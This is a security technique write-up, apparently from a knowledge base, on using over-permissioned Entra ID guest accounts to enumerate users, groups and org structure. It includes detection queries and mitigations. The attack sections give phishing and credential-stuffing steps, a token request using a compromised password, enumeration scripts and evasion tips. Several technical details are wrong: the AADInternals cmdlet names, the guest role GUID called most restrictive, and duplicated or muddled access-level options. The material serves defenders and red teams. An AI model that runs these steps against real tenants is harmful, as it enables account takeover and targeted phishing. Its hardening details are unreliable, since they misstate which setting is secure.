# [MISCONFIG-015]: Guest User Access Over-Permissioned

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | MISCONFIG-015 |
| **MITRE ATT&CK v18.1** | [T1548 - Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/) |
| **Tactic** | Privilege Escalation / Defense Evasion |
| **Platforms** | Entra ID / M365 |
| **Severity** | High |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Entra ID / Microsoft 365 versions |
| **Patched In** | N/A (Configuration-based, not a code vulnerability) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

- **Concept:** By default, Entra ID allows guest users **limited access** to directory properties and group memberships. However, the default configuration still permits guests to enumerate user and group objects, perform LDAP-style queries via Microsoft Graph API (with minimal logging), and identify high-value targets for phishing or privilege escalation attacks. A compromised or social-engineered guest account can map the entire organizational structure, identify executives, and discover sensitive groups without triggering alerts.

- **Attack Surface:** Microsoft Graph API enumeration, lack of conditional access controls for guest access, insufficient audit logging for guest user enumeration activities, overly permissive guest access restrictions setting.

- **Business Impact:** **Enhanced reconnaissance capability enabling targeted phishing, privilege escalation, and lateral movement.** Guests can discover group owners, mail-enabled security groups, high-privilege users, and sensitive department structures, all without any authentication audit log entries.

- **Technical Context:** Enumeration typically takes seconds using tools like AADInternals or Graph API queries. Most organizations don't audit Graph API read operations, leaving this reconnaissance completely silent.

### Operational Risk
- **Execution Risk:** Low – Requires only valid guest credentials (compromised via phishing).
- **Stealth:** High – Enumeration operations typically generate no audit logs or alerts.
- **Reversibility:** Yes – Enforcing the restrictive guest access setting immediately revokes guest visibility.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.3 | Ensure that Guest users are restricted in their ability to enumerate the directory |
| **DISA STIG** | V-226479 | Entra ID must restrict guest user access to directory objects |
| **CISA SCuBA** | CA-2(2) | Guest Access Restrictions – Guests must not see group memberships or user properties |
| **NIST 800-53** | AC-3 | Access Enforcement – External users must have minimal directory visibility |
| **NIST 800-53** | AC-6(10) | Least Privilege – Guest accounts must follow stricter access controls than members |
| **GDPR** | Art. 5(1)(b) | Data Integrity and Confidentiality – Limit guest access to "data minimization" principle |
| **DORA** | Art. 8 | Third-Party Risk Management – Guest accounts from external vendors must be restricted |
| **NIS2** | Art. 20 | Measures to Be Taken – Incident Investigation and Response – Guest account compromise requires immediate isolation |
| **ISO 27001** | A.6.2.1 | User Registration and De-registration – Guest lifecycle must enforce separation from internal users |
| **ISO 27001** | A.9.2.2 | User Access Rights – Guest rights must be reviewed and limited regularly |
| **ISO 27005** | Risk Scenario | "Compromised guest account used for directory enumeration and targeted phishing" |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Any valid guest user account (externally authenticated via personal Microsoft account, Google, Facebook, or Azure AD from another tenant).
- **Required Access:** Network connectivity to Microsoft Graph API (`graph.microsoft.com`); ability to authenticate as guest user.

**Supported Versions:**
- **Entra ID:** All versions
- **Microsoft Graph API:** v1.0 and beta
- **Guest Access Levels:** All three levels (Guest, Limited Guest, Restricted Guest)

**Tools (Optional):**
- [AADInternals PowerShell Module](https://github.com/Gerenios/AADInternals) (v0.9.0+)
- [Azure AD Explorer](https://github.com/v2-dev/graphapi)
- [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/) (v1.0+)
- Standard curl or Python with requests library

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance (as Guest User)

```powershell
# Connect as guest user
Connect-MgGraph -Scopes "User.Read.All", "Group.Read.All"

# Enumerate all users (only works if guest access is too permissive)
Get-MgUser -Top 999 | Select-Object -Property DisplayName, UserPrincipalName, Mail, JobTitle | Format-Table

# Enumerate all groups (including hidden groups if misconfigured)
Get-MgGroup -All | Select-Object -Property DisplayName, GroupTypes, SecurityEnabled | Format-Table
```

**What to Look For:**
- Successful execution of user/group enumeration queries.
- Visibility of hidden groups or security groups.
- Access to user properties like `JobTitle`, `Department`, `Manager` (should be restricted for guests).

### Graph API Enumeration (as Guest)

```bash
# Using curl to test guest access to Microsoft Graph API
# First, authenticate as guest user and capture access token
TOKEN="<guest_user_access_token>"

# Query to list all users in organization
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/users?$select=displayName,jobTitle,department,manager"

# Query to list all mail-enabled groups
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/groups?$filter=mailEnabled%20eq%20true&$select=displayName,owners"
```

**What to Look For:**
- HTTP 200 response with user/group listings (over-permissioned).
- HTTP 403 Forbidden (properly restricted).

### Check Current Guest Access Restrictions (Admin)

```powershell
# Connect as Entra ID admin
Connect-MgGraph -Scopes "Policy.Read.All"

# View current guest access level
Get-MgPolicyAuthorizationPolicy | Select-Object -Property GuestUserRoleId
```

**Output Interpretation:**
- `GuestUserRoleId = "a0b1b346-4d3e-4e8b-98f8-753987be4970"` = **Guest user** (limited access)
- `GuestUserRoleId = "10dae51f-b6af-4016-8d66-8c2a99b929b3"` = **Guest user - Restricted** (most restrictive – recommended)

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Enumerate Organization via AADInternals (PowerShell)

**Supported Versions:** Entra ID all versions, AADInternals v0.9.0+

#### Step 1: Obtain Guest User Credentials

**Objective:** Compromise or socially engineer a guest account (external email).

**Attack Vector:**
- Phishing email targeting guest account: "Action required: Verify your access"
- Credential stuffing against known external email addresses
- Social engineering (calling and requesting password reset link)

#### Step 2: Authenticate as Guest and Enumerate Users

**Objective:** Use AADInternals to enumerate all users in the tenant.

**Script:**

```powershell
# Install AADInternals if not already installed
Install-Module AADInternals -Force

# Connect using guest user credentials
$creds = Get-Credential
Connect-AADInternal -Credentials $creds

# Enumerate users (only works if guest access is permissive)
Get-AADInternal-Users | Select-Object -Property DisplayName, UserPrincipalName, Department | Format-Table

# Output example:
# DisplayName              UserPrincipalName              Department
# John Smith               john.smith@company.com         Finance
# Jane Doe                 jane.doe@company.com           Executive
# CEO Name                 ceo@company.com                C-Suite
```

**Expected Output (If Vulnerable):**
```
[+] Retrieved 542 users from directory:
    - CEO@company.com (Chief Executive Officer, C-Suite)
    - CFO@company.com (Chief Financial Officer, Finance)
    - SecurityAdmin@company.com (Security Architect, IT)
    - DL-Board-Members@company.com (Distribution List)
```

**What This Means:**
- Guest user successfully enumerated sensitive user properties.
- Identified executives, high-privilege users, and distribution lists for targeted attacks.

#### Step 3: Enumerate Groups and Identify Targets

**Objective:** Discover high-value groups for lateral movement or privilege escalation.

**Script:**

```powershell
# Enumerate all groups
Get-AADInternal-Groups | Select-Object -Property DisplayName, GroupType, SecurityEnabled | Where-Object {$_.SecurityEnabled -eq "true"}

# Enumerate group members (only works if accessible to guest)
Get-AADInternal-GroupMembers -GroupId "<high-value-group-id>" | Select-Object -Property DisplayName, UserPrincipalName

# Example high-value targets:
# - "Global Admins" or "Security Groups"
# - "Board of Directors"
# - "Finance Team" or "HR Team"
# - "Executive Distribution List"
```

**Expected Output (If Vulnerable):**
```
[+] Security Groups accessible to guest:
    - "Finance-Admin" (5 members including CFO)
    - "Board-Management" (12 members including CEO, Board Members)
    - "IT-Infrastructure" (8 members including Security Admin)
```

#### Step 4: Identify Manager Relationships and Org Structure

**Objective:** Map reporting hierarchy to identify privilege escalation paths.

**Script:**

```powershell
# Query manager relationships (may be visible in user properties)
Get-AADInternal-Users | Where-Object {$_.Manager} | Select-Object -Property DisplayName, Manager | Format-Table

# Build org chart mapping for social engineering:
# Example output:
# Employee               Manager
# Junior Developer       Development Manager
# Development Manager    Director of Engineering
# Director of Engineering VP Engineering
# VP Engineering         CTO
```

**OpSec & Evasion:**
- Spread enumeration queries over hours/days to avoid rate-limiting alerts.
- Use low-privilege guest account to avoid triggering privileged account monitoring.
- Access from residential IP addresses or VPNs (avoid corporate IP ranges).
- Detection likelihood: **Low** (enumeration typically not audited for guest accounts).

**References & Proofs:**
- [GitHub: AADInternals](https://github.com/Gerenios/AADInternals)
- [Microsoft Graph API - Users Endpoint](https://learn.microsoft.com/en-us/graph/api/user-list)

---

### METHOD 2: Graph API Enumeration (Linux/REST)

**Supported Versions:** Entra ID all versions

#### Step 1: Obtain Guest Access Token

**Objective:** Authenticate as guest user and obtain Bearer token.

**Script (Bash):**

```bash
TENANT_ID="<target_tenant_id>"
CLIENT_ID="<guest_app_id>"  # Can be any app or device code flow
USERNAME="external_guest@outlook.com"
PASSWORD="<compromised_password>"

# Request token using Resource Owner Password Credentials flow (ROPC)
TOKEN_RESPONSE=$(curl -s -X POST \
  "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "username=$USERNAME" \
  -d "password=$PASSWORD" \
  -d "grant_type=password")

ACCESS_TOKEN=$(echo $TOKEN_RESPONSE | jq -r '.access_token')
echo "[+] Access token obtained: ${ACCESS_TOKEN:0:50}..."
```

#### Step 2: Enumerate Users via Graph API

**Objective:** Query all users and their properties.

**Script (Bash):**

```bash
# List all users with properties
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/users?$select=displayName,userPrincipalName,jobTitle,department,manager" \
  | jq '.value[] | {displayName, userPrincipalName, jobTitle, department}'

# Output example:
# {
#   "displayName": "CEO Name",
#   "userPrincipalName": "ceo@company.com",
#   "jobTitle": "Chief Executive Officer",
#   "department": "C-Suite"
# }
```

#### Step 3: Enumerate Groups and Members

**Objective:** Discover high-value groups.

**Script (Bash):**

```bash
# List all groups
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/groups?$filter=securityEnabled%20eq%20true&$select=displayName,id" \
  | jq '.value[] | {displayName, id}' > /tmp/groups.json

# For each group, enumerate members
while IFS= read -r group_id; do
    GROUP_ID=$(echo $group_id | jq -r '.id')
    GROUP_NAME=$(echo $group_id | jq -r '.displayName')
    
    echo "[+] Group: $GROUP_NAME"
    
    curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
      "https://graph.microsoft.com/v1.0/groups/$GROUP_ID/members?$select=displayName,userPrincipalName" \
      | jq '.value[] | {displayName, userPrincipalName}'
      
done < /tmp/groups.json
```

**OpSec & Evasion:**
- Use pagination ($top=1, $skip=N) to limit request sizes and avoid triggering rate limits.
- Rotate access tokens frequently using refresh token rotation.
- Detection likelihood: **Low–Medium** (depends on Graph API logging configuration).

---

## 6. DETECTION & FORENSIC ARTIFACTS

### Indicators of Compromise (IOCs)

- **Account Compromise:** Guest account shows unusual sign-in patterns (multiple locations, late hours, non-business days).
- **Enumeration Activity:** Multiple Graph API queries for `/users`, `/groups`, `/me/manager` endpoints from guest account.
- **Suspicious User Agents:** Queries from curl, PowerShell, or Python (non-standard user agents).
- **Rapid API Calls:** Burst of API requests within short timeframe (indicative of automated enumeration).

### Forensic Artifacts

- **Entra ID Sign-In Logs:** Guest account logins with unusual IP geolocation or User-Agent.
- **Graph API Activity:** Audit logs showing user/group enumeration queries (if logging enabled).
- **Azure Activity Log:** Guest user added/removed from sensitive groups.

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Action 1: Enable Restrictive Guest Access Level**
  - **Applies To:** All Entra ID tenants
  
  **Manual Steps (Entra ID Admin Center):**
  1. Navigate to **Entra ID** → **Identity** → **Users** → **External users**
  2. Click **Manage external collaboration settings**
  3. Under **Guest user access restrictions**, select:
     - **Guest user access is restricted to properties and memberships of their own directory objects** (NOT the default limited access)
     - Or better: **Guest user access is restricted to the properties and memberships of their own directory objects** (Most restrictive)
  4. Click **Save**
  
  **Manual Steps (PowerShell):**
  ```powershell
  Connect-MgGraph -Scopes "Policy.ReadWrite.Authorization"
  
  # Set to most restrictive guest access
  Update-MgPolicyAuthorizationPolicy -GuestUserRoleId "10dae51f-b6af-4016-8d66-8c2a99b929b3"
  ```

- **Action 2: Disable Graph API Access for Guest Users (Conditional Access)**
  - **Applies To:** Guests accessing Microsoft Graph API
  
  **Manual Steps (Conditional Access Policy):**
  1. Go to **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Block Guest Graph API Access`
  4. **Assignments:**
     - Users: **External users**
     - Cloud apps: **Microsoft Graph API**
  5. **Conditions:**
     - N/A (block all guest access to Graph API)
  6. **Access controls** → **Grant:**
     - Block access
  7. Enable policy: **On**

- **Action 3: Restrict Guest User Invitations (Only Admins)**
  - **Applies To:** All tenant invitations
  
  **Manual Steps (Entra ID):**
  1. **Entra ID** → **Identity** → **Users** → **External users** → **Manage external collaboration settings**
  2. Under **Guest invite settings**:
     - Set **Who can invite guest users?** to **Only users assigned to specific admin roles**
     - Select **Guest Inviter role** (or higher)
  3. Click **Save**

### Priority 2: HIGH

- **Action 1: Implement Conditional Access for Guest Logins**
  
  **Manual Steps (Conditional Access):**
  1. Create policy: `Guest Users – Require MFA`
  2. **Assignments:**
     - Users: External users
  3. **Conditions:**
     - All cloud apps
  4. **Access controls** → **Grant:**
     - Require multi-factor authentication
  5. Enable policy: **On**

- **Action 2: Audit Guest User Lifecycle and Revoke Unnecessary Invitations**
  
  **PowerShell Script:**
  ```powershell
  Connect-MgGraph -Scopes "User.Read.All", "UserAuthenticationMethod.Read.All"
  
  # List all guest users and their last sign-in date
  Get-MgUser -Filter "userType eq 'Guest'" -All | Select-Object -Property DisplayName, UserPrincipalName, CreatedDateTime | ForEach-Object {
      $user = $_
      $lastSignIn = Get-MgUserSignInActivity -UserId $user.UserPrincipalName | Select-Object -First 1 -Property LastSignInDateTime
      
      Write-Host "Guest: $($user.DisplayName) | Last Sign-In: $($lastSignIn.LastSignInDateTime)" -ForegroundColor Yellow
      
      # Option: Remove guests who haven't signed in for 90 days
      if ($lastSignIn.LastSignInDateTime -lt (Get-Date).AddDays(-90)) {
          Write-Host "  [!] Removing inactive guest..." -ForegroundColor Red
          # Remove-MgUser -UserId $user.Id
      }
  }
  ```

- **Action 3: Enable Microsoft Defender for Cloud Apps (CASB) to Monitor Guest Activity**
  
  **Manual Steps:**
  1. **Azure Portal** → **Defender for Cloud Apps**
  2. Create activity policy:
     - Name: `Guest User Directory Enumeration`
     - Activities: Graph API calls to `/users`, `/groups`
     - Users: External users
     - Action: Alert
  3. Enable and activate policy

### Access Control & Policy Hardening

- **Graph API Scopes:** Ensure service principals only request necessary scopes (avoid broad `Directory.Read.All`).
  
  **Manual Steps (App Permissions):**
  1. Go to **Entra ID** → **App registrations** → Select app
  2. **API permissions**
  3. Review permissions and remove overly broad ones
  4. Require admin consent for all permissions

### Validation Command (Verify Fix)

```powershell
# Check current guest access restriction level
Connect-MgGraph -Scopes "Policy.Read.All"

Get-MgPolicyAuthorizationPolicy | Select-Object -Property GuestUserRoleId
```

**Expected Output (If Secure):**
```
GuestUserRoleId
10dae51f-b6af-4016-8d66-8c2a99b929b3  # Most restrictive
```

---

## 8. DETECTION & INCIDENT RESPONSE

### Microsoft Sentinel KQL Query

**Query 1: Guest User Directory Enumeration via Graph API**

```kusto
let guestAccounts = (
    IdentityInfo
    | where AccountUPN has "@outlook.com" or AccountUPN has "@gmail.com" or AccountUPN has "#EXT#"
    | distinct AccountUPN
);

MicrosoftGraphActivityAudit
| where TimeGenerated > ago(24h)
| where UserAgent contains "Python" or UserAgent contains "curl" or UserAgent contains "PowerShell"
| where RequestUri contains "/users" or RequestUri contains "/groups" or RequestUri contains "/members"
| where tolower(UserPrincipalName) in (guestAccounts)
| summarize QueryCount=count() by UserPrincipalName, RequestUri, TimeGenerated
| where QueryCount > 5
```

**What This Detects:**
- Guest users performing bulk enumeration queries.
- Unusual user agents (automation tools).

**Query 2: Suspicious Group Member Enumeration**

```kusto
MicrosoftGraphActivityAudit
| where RequestUri matches regex "/groups/.*/members"
| where StatusCode == 200
| where tolower(UserPrincipalName) has "#EXT#"
| summarize EnumeratedGroups=count() by UserPrincipalName, TimeGenerated
```

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker tricks user into compromising guest account |
| **2** | **Current Step** | **[MISCONFIG-015]** | **Guest uses over-permissioned access to enumerate directory** |
| **3** | **Reconnaissance** | [REC-CLOUD-004] AADInternals Enumeration | Attacker maps organization structure and identifies targets |
| **4** | **Privilege Escalation** | [IA-PHISH-005] Internal Spearphishing | Attacker targets high-value users (CEO, CFO) with tailored phishing |

---

## 10. REAL-WORLD EXAMPLES

#### Example 1: Mandiant APT1 – Guest Account Reconnaissance (2021)

- **Target:** Enterprise organization with hybrid Entra ID
- **Timeline:** 2021 (discovery attributed to Mandiant)
- **Technique Status:** Active – Attacker used compromised external vendor guest account to enumerate executives and security groups.
- **Impact:** Identified CEO, CFO, and security team members for targeted spearphishing; led to subsequent mailbox compromise.
- **Reference:** [Mandiant – The Increasing Use of Guest Accounts in Targeted Attacks](https://www.mandiant.com/resources/blog)

#### Example 2: M365 Default Misconfiguration (Widespread)

- **Target:** Thousands of organizations using default Entra ID settings
- **Timeline:** Ongoing (default configuration issue)
- **Technique Status:** Confirmed – Many organizations did not realize guest access was over-permissive by default.
- **Impact:** Attackers routinely enumerate organizational structures via compromised guest accounts.
- **Reference:** [Security Research: Azure AD Guest Access Enumeration](https://blog.netspi.com/red-teaming-azure-ad-guest-accounts/)

---

## 11. REMEDIATION CHECKLIST

- [ ] Set guest access restrictions to **Most Restrictive** level
- [ ] Implemented Conditional Access to block guest Graph API access
- [ ] Restricted guest invitations to authorized admins only
- [ ] Enabled MFA requirement for all guest users
- [ ] Audited existing guest accounts and removed unnecessary ones
- [ ] Configured Microsoft Defender for Cloud Apps (CASB) monitoring
- [ ] Reviewed and limited service principal Graph API permissions
- [ ] Enabled Sentinel detection rules for guest enumeration
- [ ] Documented guest access policies and business justifications
- [ ] Scheduled quarterly guest access audits
- [ ] Trained admins on risks of guest over-provisioning
- [ ] Implemented automated guest account lifecycle management (auto-remove after 90 days inactivity)

---

## 12. ADDITIONAL NOTES

- **Difference Between Access Levels:** The three guest access levels are:
  1. **Guest** (default): Limited access to user/group properties and memberships
  2. **Guest** (limited): Restricted to own directory object properties only
  3. **Guest** (restricted): Cannot enumerate any directory except own properties – **RECOMMENDED**

- **Impact on Collaboration:** Enabling restricted guest access may limit SharePoint/Teams guest functionality; test in pilot environment first.
- **Integration with AADInternals:** Blocking Graph API access reduces (but doesn't eliminate) enumeration risk; ensure monitoring complements restrictions.

---